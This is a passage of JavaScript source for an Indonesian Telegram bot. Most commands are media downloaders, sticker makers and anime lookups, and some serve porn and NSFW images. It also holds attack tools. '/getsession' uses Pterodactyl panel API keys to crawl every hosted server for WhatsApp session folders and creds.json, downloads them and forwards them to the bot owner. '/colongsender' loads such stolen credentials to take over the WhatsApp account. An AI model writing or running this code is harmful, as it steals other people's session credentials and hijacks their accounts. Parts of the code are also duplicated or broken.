        return ctx.reply("❌ Lagu tidak ditemukan.");
      }

      spotifyUrl = search.data.tracks[0].link;
    }

    const dl = await axios.get(
      "https://ikyyzyyrestapi.my.id/download/spotifydl",
      {
        params: {
          apikey: "kyzz",
          url: spotifyUrl
        },
        timeout: 120000
      }
    );

    await ctx.deleteMessage(loading.message_id).catch(() => {});

    if (!dl.data?.status) {
      return ctx.reply("❌ Gagal download lagu.");
    }

    const meta = dl.data.result.metadata;
    const audioUrl = dl.data.result.download;

    await ctx.replyWithPhoto(
      { url: meta.img },
      {
        caption:
`🎵 *${meta.song_name}*

👤 Artist: ${meta.artist}
💿 Album: ${meta.album_name}
⏱ Durasi: ${meta.duration}
📅 Rilis: ${meta.released}`,
        parse_mode: "Markdown"
      }
    );

    await ctx.replyWithAudio(
      { url: audioUrl },
      {
        title: meta.song_name,
        performer: meta.artist
      }
    );

  } catch (err) {
    console.error("Error SpotifyPlay:", err.response?.data || err.message || err);
    ctx.reply("❌ Terjadi kesalahan saat memproses lagu.");
  }
});


bot.command('iqc', async (ctx) => {
  try {
    const chatId = ctx.chat.id;

    // Ambil text setelah command
    const text = ctx.message.text.split(' ').slice(1).join(' ');

    if (!text) {
      return ctx.reply(
        "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
        { parse_mode: "Markdown" }
      );
    }

    let [time, battery, carrier, ...msgParts] = text.split("|");

    if (!time || !battery || !carrier || msgParts.length === 0) {
      return ctx.reply(
        "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
        { parse_mode: "Markdown" }
      );
    }

    await ctx.reply("⏳ Tunggu sebentar...");

    const messageText = encodeURIComponent(msgParts.join("|").trim());

    const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;

    const res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    const arrayBuffer = await res.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: "✅ Nih hasilnya",
        parse_mode: "Markdown"
      }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("videy", async (ctx) => {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    
    if (!input || !input.startsWith("http")) {
      return ctx.reply(
        "❌ Kirim perintah dengan menyertakan URL video dari videy.co\nContoh: `/videydl https://videy.co/v?id=XXXX`",
        { parse_mode: "Markdown" }
      );
    }

    await ctx.reply("⏳ Sedang memproses video...");

    try {
      const res = await axios.post(
        "https://fastapi.acodes.my.id/api/downloader/videy",
        { text: input },
        {
          headers: {
            accept: "*/*",
            "Content-Type": "application/json",
          },
        }
      );

      if (res.data?.status && res.data?.data) {
        await ctx.replyWithVideo(
          { url: res.data.data },
          { caption: "✅ Video berhasil diunduh dari videy.co!" }
        );
      } else {
        await ctx.reply("❌ Gagal mendapatkan video. Coba cek ulang link-nya.");
      }
    } catch (err) {
      console.error("VideyDL error:", err.message || err);
      ctx.reply("❌ Terjadi kesalahan saat memproses video.");
    }
  });
 
   bot.command("cekefek", async (ctx) => {
  const reply = ctx.message.reply_to_message?.text;
  if (!reply)
    return ctx.reply("⚠️ Balas ke potongan kode yang ingin dianalisa dengan /efekfunc.");

  await ctx.reply("🔎 Analisa cepat efek (simple) — tunggu sebentar...");

  // Deteksi efek / pola berbahaya
  let efek = "Tidak terdeteksi";
  let indikator = "Tidak ditemukan";
  let indikasiCuplikan = "";

  if (/fetch|axios|http|https|socket|ws|wss/i.test(reply)) {
    efek = "🌐 Exfiltrate / Network";
    indikator = "Mengirim / menerima data jaringan.";
  } else if (/crash|loop|repeat\(/i.test(reply)) {
    efek = "💣 Crash / Overload";
    indikator = "Loop besar atau operasi berat terdeteksi.";
  } else if (/child_process|exec|spawn/i.test(reply)) {
    efek = "⚙️ System Access / Command Injection";
    indikator = "Menjalankan perintah sistem.";
  } else if (/process\.kill|process\.exit/i.test(reply)) {
    efek = "🧨 Process Kill Attempt";
    indikator = "Upaya mematikan proses terdeteksi.";
  } else if (/atob|btoa|Buffer\.from/i.test(reply)) {
    efek = "🌀 Encoding / Obfuscation";
    indikator = "Kode menyembunyikan data atau base64 decode/encode.";
  }

  // Ambil cuplikan indikasi
  const lines = reply.split("\n");
  const foundIndex = lines.findIndex((l) =>
    l.match(/fetch|axios|http|repeat|exec|process|Buffer|btoa/i)
  );
  if (foundIndex >= 0) {
    indikasiCuplikan = lines
      .slice(Math.max(0, foundIndex - 1), foundIndex + 2)
      .join("\n");
  }

  await ctx.replyWithMarkdown(
    `🧠 *Analisa Efek (simple)*\n` +
    `📂 *Sumber:* Potongan teks (reply)\n\n` +
    `🔎 *Efek Teridentifikasi:* ${efek}\n` +
    `🔎 *Indikator yang ditemukan:* ${indikator}\n\n` +
    `📘 *Cuplikan (sekitar indikasi pertama):*\n\`\`\`js\n${indikasiCuplikan || "Tidak ditemukan indikasi mencurigakan"}\n\`\`\``
  );
});

bot.command('denc', checkPremium, async (ctx) => {
  if (!ctx.message.reply_to_message) return ctx.reply("🪧 ☇ Format: /decryptcode (reply javascript document)")
  const replied = ctx.message.reply_to_message
  if (!replied.document) return ctx.reply("❌ ☇ Pesan yang di reply bukan file")

  const fileName = replied.document.file_name || 'file.js'
  if (!fileName.endsWith('.js')) return ctx.reply("❌ ☇ File harus format .js")

  const MAX = 8 * 1024 * 1024
  if (replied.document.file_size > MAX) return ctx.reply("❌ ☇ File terlalu besar")

  const processing = await ctx.reply(`✅ ☇ Mengunduh dan memproses dekripsi ${fileName}`)

  try {
    const fileLink = await ctx.telegram.getFileLink(replied.document.file_id)
    const tmpDir = path.join(__dirname, 'temp')
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir)

    const tmpPath = path.join(tmpDir, fileName)
    const resp = await axios({ url: fileLink.href, method: 'GET', responseType: 'stream' })
    await pipeline(resp.data, createWriteStream(tmpPath))

    let code = fs.readFileSync(tmpPath, 'utf8')
    let deob = deobfuscatePipeline(code)

    if (deob.length < code.length / 2 || /\\x[0-9A-Fa-f]{2}/.test(deob)) {
      const dynamicPath = await deobfuscatePipelineDynamic(tmpPath)
      deob = fs.readFileSync(dynamicPath, 'utf8')
    }

    const outPath = tmpPath.replace(/\.js$/, '_void_decrypt.js')
    fs.writeFileSync(outPath, deob, 'utf8')

    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `✅ ☇ Selesai di dekripsi sedang mengirim ${path.basename(outPath)}`)
    await ctx.replyWithDocument({ source: outPath, filename: path.basename(outPath) })

    try { fs.unlinkSync(tmpPath); fs.unlinkSync(outPath) } catch(e){}
  } catch (err) {
    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `❌ ☇ Gagal mendekripsi karena error: ${err.message}`)
  }
});

bot.command("gethtml", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const url = ctx.message.text.split(' ')[1]; // Mengambil URL dari command

  // Validasi URL
  if (!url || !/^https?:\/\//i.test(url)) {
    return ctx.reply("🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`", {
      parse_mode: "Markdown",
    });
  }

  try {
    await ctx.reply("⏳ Mengambil source code dari URL...");

    const res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ *Gagal mengambil source code dari URL tersebut!*");
    }

    const html = await res.text();
    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    // Mengirim file sebagai document
    await ctx.replyWithDocument({
      source: filePath,
      filename: "source_code.html",
      contentType: "text/html"
    });

    fs.unlinkSync(filePath); // Hapus file setelah dikirim
    
  } catch (err) {
    console.error(err);
    ctx.reply(`❌ *Terjadi kesalahan:*\n\`${err.message}\``, {
      parse_mode: "Markdown",
    });
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat ziper ganteng", { parse_mode: "Markdown" });

  try {
    // Kirim emoji reaksi manual
    await ctx.reply("✨ Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    // Optional: hapus file setelah kirim
    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command(["ytsearch", "youtubesearch"], async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Masukkan query parameters!");

  ctx.reply("🔍 Sedang mencari...");

  try {
    const anu = `https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(
      text
    )}`;
    const { data: response } = await axios.get(anu);

    const url = response.result.url;
    const caption = `🎵 Title: ${response.result.title}\n📜 Description: ${response.result.description}\n👀 Views: ${response.result.views}`;

    ctx.reply(caption, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Download MP3", callback_data: `ytmp3 ${url}` }],
          [{ text: "Download MP4", callback_data: `ytmp4 ${url}` }],
        ],
      },
    });
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi kesalahan!");
  }
});

////NEW TOOLS

bot.command('cekbio', checkPremium, async (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.split(' ').slice(1);
  const phoneNumber = args[0];
  
  if (!phoneNumber) {
    return ctx.reply(`
Cara Penggunaan:
<code>/cekbio 6281234567890</code>

Contoh:
<code>/cekbio 6281234567890</code>`, { parse_mode: "HTML" });
  }
  
  const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");
  if (cleanNumber.length < 10) {
    return ctx.reply("❌ Format nomor tidak valid");
  }
  
  try {
    await ctx.reply("⏳ Memproses permintaan...");
    
    // PERUBAHAN: PAKE ctx.telegram, BUKAN bot
    const user = await ctx.telegram.getChat(cleanNumber);
    
    if (!user) {
      return ctx.reply(`
❌ NOMOR TIDAK AKTIF
<blockquote>📱 ${cleanNumber}
Status: Tidak terdaftar</blockquote>`, { parse_mode: "HTML" });
    }
    
    let badge = "⚪";
    let accountType = "REGULAR";
    if (user.is_premium) { accountType = "PREMIUM"; badge = "⭐"; }
    if (user.business_info) { accountType = "BUSINESS"; badge = "💼"; }
    
    const firstName = user.first_name || '';
    const lastName = user.last_name || '';
    const fullName = `${firstName} ${lastName}`.trim();
    const username = user.username ? `@${user.username}` : "-";
    
    let lastSeen = "-";
    if (user.last_online_date) {
      lastSeen = new Date(user.last_online_date * 1000).toLocaleString('id-ID');
    }
    
    await ctx.reply(`
✅ NOMOR AKTIF ${badge}
<blockquote>📱 ${cleanNumber}
👤 ${fullName || '-'}
🆔 ${username}
🎯 ${accountType}
${user.is_bot ? '🤖 Bot' : '👤 User'}</blockquote>
<blockquote>ID: ${user.id}
Premium: ${user.is_premium ? '✅' : '❌'}
Business: ${user.business_info ? '✅' : '❌'}
Terakhir: ${lastSeen}</blockquote>
✅ Status: Aktif di Telegram`, { 
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id 
    });
    
  } catch (error) {
    if (error.code === 400) {
      ctx.reply(`
❌ NOMOR TIDAK VALID
<blockquote>${cleanNumber}
Tidak terdaftar di Telegram</blockquote>`, { 
        parse_mode: "HTML",
        reply_to_message_id: ctx.message.message_id 
      });
    } else if (error.code === 403) {
      ctx.reply(`
🔒 NOMOR TERPROTEKSI
<blockquote>${cleanNumber}
Tidak dapat diakses</blockquote>`, { 
        parse_mode: "HTML",
        reply_to_message_id: ctx.message.message_id 
      });
    } else if (error.code === 429) {
      ctx.reply("⚠️ Terlalu banyak permintaan", { 
        reply_to_message_id: ctx.message.message_id 
      });
    } else {
      ctx.reply(`❌ Error: ${error.message}`, { 
        reply_to_message_id: ctx.message.message_id 
      });
    }
  }
});

bot.command("sendbokep", async (ctx) => {
  try {
    const videoList = [
      "https://files.catbox.moe/vub6iy.mp4",
      "https://files.catbox.moe/q6rmt3.mp4",
      "https://files.catbox.moe/qcbjxo.mp4",
      "https://files.catbox.moe/t9k0s8.mp4",
      "https://files.catbox.moe/0dg63j.mp4",
      "https://files.catbox.moe/7q5ui1.mp4",
      "https://files.catbox.moe/ssev7k.mp4"
    ];

    // ============ KIRIM PESAN "SABAR" DULU ============
    await ctx.reply("⏳ Sabar ya, lagi ngambil video random...");
    // ==================================================

    const randomIndex = Math.floor(Math.random() * videoList.length);
    const randomVideo = videoList[randomIndex];

    await ctx.replyWithVideo(randomVideo, {
      caption: `🤤 NIH BOKEP`
    });

  } catch (error) {
    console.error("Error videorandom:", error);
    ctx.reply("❌ Gagal mengambil video random.");
  }
});

bot.command('openfile', checkPremium, async (ctx) => {
  try {
    // CEK HARUS REPLY KE FILE
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
      return ctx.reply('❌ Reply ke file yang mau dibuka!', { 
        reply_to_message_id: ctx.message.message_id 
      });
    }

    const document = ctx.message.reply_to_message.document;
    const fileId = document.file_id;
    const fileName = document.file_name || 'unknown.txt';
    const fileSize = document.file_size || 0;

    // BATAS UKURAN FILE (MAX 1MB)
    if (fileSize > 1024 * 1024) {
      return ctx.reply('❌ File terlalu besar! Maksimal 1MB.');
    }

    await ctx.reply(`📂 Mengambil file *${fileName}*...`, { parse_mode: 'Markdown' });

    // AMBIL LINK FILE
    const fileLink = await ctx.telegram.getFileLink(fileId);
    
    // DOWNLOAD ISI FILE
    const response = await axios.get(fileLink.href, { responseType: 'text' });
    let content = response.data;

    // BATASI PREVIEW
    const maxLength = 3800;
    if (content.length > maxLength) {
      content = content.slice(0, maxLength) + '\n\n... (file terpotong)';
    }

    // KIRIM HASIL
    const resultText = `
╭─⭓ *ISI FILE* ────
│ 📄 *${fileName}*
│ 📦 *${(fileSize / 1024).toFixed(2)} KB*
╰───────────────⭓

\`\`\`javascript
${content}
\`\`\`
`;

    await ctx.reply(resultText, { parse_mode: 'Markdown' });

  } catch (error) {
    console.error("Error openfile:", error.message);
    ctx.reply(`❌ Gagal membaca file: ${error.message}`);
  }
});

bot.command("cekfunc", async (ctx) => {
  try {
    if (!ctx.message.reply_to_message) {
      return ctx.reply("🪧 ☇ Reply function JavaScript yang ingin dicek.")
    }

    const text = ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption

    if (!text) {
      return ctx.reply("❌ ☇ Pesan yang direply tidak berisi kode.")
    }

    let acorn
    try {
      acorn = require("acorn")
    } catch {
      return ctx.reply("❌ ☇ Module acorn belum terinstall.\nInstall dengan: npm install acorn")
    }

    try {
      acorn.parse(text, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true
      })

      return ctx.reply(`
✅ SYNTAX VALID
━━━━━━━━━━━━━━━
🔎 Tidak ditemukan error syntax.

© FAULET XBLAUD`, { parse_mode: "HTML" })

    } catch (err) {
      const lines = text.split("\n")
      const line = err.loc.line
      const column = err.loc.column

      const start = Math.max(0, line - 3)
      const end = Math.min(lines.length, line + 2)

      const snippet = lines.slice(start, end).map((l, i) => {
        const num = start + i + 1
        return num === line
          ? `👉 ${num} | ${l}`
          : `   ${num} | ${l}`
      }).join("\n")

      return ctx.reply(`
❌ ERROR TERDETEKSI
━━━━━━━━━━━━━━━
📌 ${err.message}
📍 Line ${line}:${column}

📋 Cuplikan:
\`\`\`javascript
${snippet}
\`\`\`

© χ-ɖʀєαɖ`, { parse_mode: "HTML" })
    }

  } catch (e) {
    console.error(e)
    ctx.reply("❌ ☇ Terjadi error saat mengecek function.")
  }
})

bot.command('tofotolive', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    
    if (args.length < 2) {
      return ctx.reply(`
❌ FORMAT SALAH
━━━━━━━━━━━━━━━
Gunakan format:
<code>/tofotolive &lt;videoUrl&gt; &lt;audioUrl&gt; [fade]</code>

Contoh:
<code>/tofotolive https://.../video.mp4 https://.../audio.mp3 0.5</code>
`, { parse_mode: "HTML" });
    }

    const [videoUrl, audioUrl, fade] = args;
    const statusMessage = await ctx.reply('⏳ Sedang memproses, harap tunggu...');

    let apiUrl = `https://shynne-apis.vercel.app/tools/livephoto?videoUrl=${encodeURIComponent(videoUrl)}&audioUrl=${encodeURIComponent(audioUrl)}`;
    if (fade) {
      apiUrl += `&fade=${fade}`;
    }

    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer'
    });
    
    await ctx.replyWithDocument({
      source: Buffer.from(response.data),
      filename: 'livephoto.mov'
    }, {
      caption: '✅ Foto Live berhasil dibuat!'
    });

    await ctx.deleteMessage(statusMessage.message_id);

  } catch (error) {
    console.error(error);
    await ctx.reply('❌ TERJADI KESALAHAN\n\nGagal membuat foto live. Pastikan link video dan audio valid dan dapat diakses secara publik.');
  }
});

bot.command("getsession", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /getsession https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

     totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("getnsfw", checkPremium, async (ctx) => {
  try {
    const nsfwTypes = [
      "hentai", "ass", "boobs", "paizuri", "thigh",
      "hanal", "hass", "pgif", "4k", "lewdneko", "lewdkitsune"
    ];
    
    const randomType = nsfwTypes[Math.floor(Math.random() * nsfwTypes.length)];

    const res = await fetchJsonHttps(`https://nekobot.xyz/api/image?type=${randomType}`);
    
    if (res && res.message) {
      await ctx.replyWithVideo(res.message, {
        caption: `✅ ☇ Gambar berhasil dibuat`
      });
    } else {
      ctx.reply("❌ ☇ Gagal membuat gambar");
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi kesalahan saat memuat gambar");
  }
});

bot.command("nsfwwaifu", checkPremium, async (ctx) => {
    // Hanya untuk pengguna premium
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'trap', 'blowjob'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply("❌ ☇ Kategori NSFW tidak valid");
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/nsfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><b>⬡═―—⊱ ⎧ NSFW WAIFU ⎭ ⊰―—═⬡</b></blockquote>🔞 Kategori: ${category}\n\n⚠️ Konten untuk dewasa`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar NSFW");
    }
});

bot.command("waifu", checkPremium, async (ctx) => {
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><b>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</b></blockquote>🌸 Kategori: ${category}`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
    }
});

bot.command('iqc', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
      return ctx.reply('Gunakan format:\n/iqc <pesan> <baterai> <operator>\n\nContoh:\n/iphone Halo dunia 87 Telkomsel');
    }

    // Gabung argumen, misalnya: [ 'Halo', 'dunia', '87', 'Telkomsel' ]
    const battery = args[args.length - 2];       // misal 87
    const carrier = args[args.length - 1];       // misal Telkomsel
    const text = args.slice(0, -2).join(' ');    // sisanya jadi pesan
    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

    await ctx.reply('⏳ Membuat quoted message gaya iPhone...');

    // 🔗 Build API URL
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

    // Ambil hasil gambar dari API
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');

    // Kirim gambar hasil API ke user
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
  } catch (err) {
    console.error('❌ Error case /iqc:', err);
    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
  }
});

bot.command('colongsender', async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;
  
  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');

  const doc = msg.reply_to_message?.document;
  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');

  const name = doc.file_name.toLowerCase();
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return ctx.reply('❌ File bukan session tolol.');

  await ctx.reply('🔄 Proses colong sender in you session…');

  const url = await bot.getFileLink(doc.file_id);
  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), data);
  } else if (name.endsWith('.zip')) {
    new AdmZip(data).extractAllTo(tmp, true);
  } else {
    const tmpTar = path.join(tmp, name);
    await fs.writeFile(tmpTar, data);
    await tar.x({ file: tmpTar, cwd: tmp });
  }

  const credsPath = await findCredsFile(tmp);
  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');

  const creds = await fs.readJson(credsPath);
  const botNumber = creds.me.id.split(':')[0];

  await fs.remove(destDir);
  await fs.copy(tmp, destDir);
  saveActiveSessions(botNumber);

  const auth = await useMultiFileAuthState(destDir);
  await connectToWhatsApp(botNumber, chatId, auth);

  return ctx.reply(`*SUCCES CONNECTING🫀*
  NUMBER : ${botNumber}
  *ANJAYYY KEMALING🗿*`);
});

bot.command("waifu", checkPremium, async (ctx) => {
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><b>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</b></blockquote>🌸 Kategori: ${category}`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
    }
});

bot.command("anime", checkPremium, async (ctx) => {
    const query = ctx.message.text.split(" ").slice(1).join(" ");
    if (!query) return ctx.reply("👀 ☇ Format: /anime <judul anime>");

    const waitMsg = await ctx.reply("⏳ ☇ Mencari anime...");

    try {
        const response = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=5`);
        
        if (!response.data.data || response.data.data.length === 0) {
            await ctx.reply("❌ ☇ Anime tidak ditemukan");
            return;
        }

        const anime = response.data.data[0];
        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ ANIME INFO ⎭ ⊰―—═⬡</b></blockquote>
🎬 <b>${anime.title}</b>
${anime.title_japanese ? `📝 ${anime.title_japanese}\n` : ''}
⭐ Rating: ${anime.score || 'N/A'}
📊 Status: ${anime.status}
📅 Episode: ${anime.episodes || 'Ongoing'}
